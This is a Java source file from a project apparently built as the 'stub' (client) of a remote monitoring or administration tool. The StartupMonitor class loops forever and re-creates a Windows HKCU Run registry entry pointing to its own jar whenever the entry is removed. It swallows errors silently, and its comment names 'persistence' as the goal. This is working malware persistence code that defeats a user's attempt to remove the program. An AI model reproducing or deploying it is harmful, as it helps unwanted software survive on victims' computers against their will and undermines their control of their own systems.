package me.jershdervis.monitorj.stub.secure;

import me.jershdervis.monitorj.stub.util.ClientSystemUtil;
import me.jershdervis.monitorj.stub.util.OSCheck;
import me.jershdervis.monitorj.stub.util.WinRegistry;
import wiki.mtf.utils.FuckingPrintln;

import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.net.URISyntaxException;

/**
 * Created by Josh on 18/06/2015.
 * This class is designed to monitor Startup keys and use persistence to keep the program in startup.
 */
public class StartupMonitor extends ClientSystemUtil implements Runnable {

    private final String keyName;

    public StartupMonitor(String keyName) {
        this.keyName = keyName;
    }

    @Override
    public void run() {
        OSCheck.OSType osType = OSCheck.getOperatingSystemType();
        while (true) {
            switch (osType) {
                case Windows:
                    if (!this.windowsStartupKeyExists(keyName)) this.createWindowsStartupKey(keyName);
                    break;
                case MacOS:
                    //TODO: Add Mac OS Startup persistence
                    break;
                case Linux:
                    //TODO: Add Linux Startup persistence
                    break;
            }
            try {
                Thread.sleep(3000L);
            } catch (InterruptedException e) {
                FuckingPrintln.out(e);
            }
        }
    }

    /**
     * Checks if the Registry Key exists in the Windows Registry
     *
     * @param name
     * @return
     */
    private boolean windowsStartupKeyExists(String name) {
        try {
            String userKey = WinRegistry.readString(WinRegistry.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", name, WinRegistry.KEY_WOW64_32KEY);
            return userKey != null;
        } catch (InvocationTargetException | IllegalAccessException e) {
        }
        return false;
    }

    /**
     * Creates the Startup key in Windows Registry
     *
     * @param name
     */
    private void createWindowsStartupKey(String name) {
        try {
            Process proc;
            synchronized (this) {
                proc = Runtime.getRuntime().exec(
                        "reg add hkcu\\microsoft\\windows\\CurrentVersion\\run\\" +
                                name + "\"" + ClientSystemUtil.jarLocationOnDisc() + "\""

                );
                Thread.sleep(1000L);
            }
            proc.destroy();
            WinRegistry.writeStringValue(WinRegistry.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", name, "\"" + ClientSystemUtil.jarLocationOnDisc() + "\"", WinRegistry.KEY_WOW64_32KEY);
        } catch (URISyntaxException | ReflectiveOperationException | IOException | InterruptedException e) {
        }
    }
}
